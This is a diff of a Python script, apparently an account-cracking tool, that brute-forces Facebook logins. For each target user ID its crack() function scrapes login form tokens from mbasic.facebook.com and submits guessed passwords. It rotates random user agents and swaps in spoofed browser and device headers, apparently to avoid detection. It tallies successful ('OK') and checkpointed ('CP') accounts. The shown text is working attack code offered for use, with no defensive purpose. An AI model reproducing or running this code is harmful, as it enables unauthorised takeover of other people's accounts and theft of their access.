@@ -537,33 +537,41 @@ def crack(idf,pwv):
 	#bo = random.choice([m,k,h,b,u,x])
 	#sys.stdout.write(f"\r [a7a] {loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
 	#sys.stdout.flush()
-	sys.stdout.write('\r\033[1;37m [$TAE] %s|\033[1;32mOK:-%s\033[1;37m \x1b[1;91mCP:-%s\033[1;37m\r'%(loop,len(oks),len(cps)));sys.stdout.flush()
+	sys.stdout.write('\r\033[1;37m [RaWa] %s|\033[1;32mOK:-%s\033[1;37m \x1b[1;91mCP:-%s\033[1;37m\r'%(loop,len(oks),len(cps)));sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen)
 	ses = requests.Session()
 	for pw in pwv:
 		try:
 			pw = pw.lower()
-			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'en-US,en;q=0.9,ar;q=0.8'})
+			ses.headers.update({'authority': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    'dpr': '2.75',
+    'sec-ch-ua': '"Google Chrome";v="87", "Chromium";v="87", "Not=A?Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"iOS"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': ua,
+    'viewport-width': '980',
+}
 			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&wtsid=rdr_0h6isQJSJIoku7Q5N&refsrc=deprecated&_rdr')
 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25221cnsoy41qoq3ut1wlpo7f1h71pjv14lfi38dkydih1d9hqges4utir%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf9117be-9ee3-4767-917a-a7a777495dd6%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221cnsoy41qoq3ut1wlpo7f1h71pjv14lfi38dkydih1d9hqges4utir%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=en_US&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			heade={'Host': 'mbasic.facebook.com',
-			'method': 'GET',
-			'scheme': 'https',
-			'referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&wtsid=rdr_0h6isQJSJIoku7Q5N&refsrc=deprecated&_rdr',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+			heade={'authority': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'max-age=0',
     'dpr': '2.75',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"',
+    'sec-ch-ua': '"Google Chrome";v="87", "Chromium";v="87", "Not=A?Brand";v="24"',
     'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-ch-ua-platform': '"iOS"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'none',
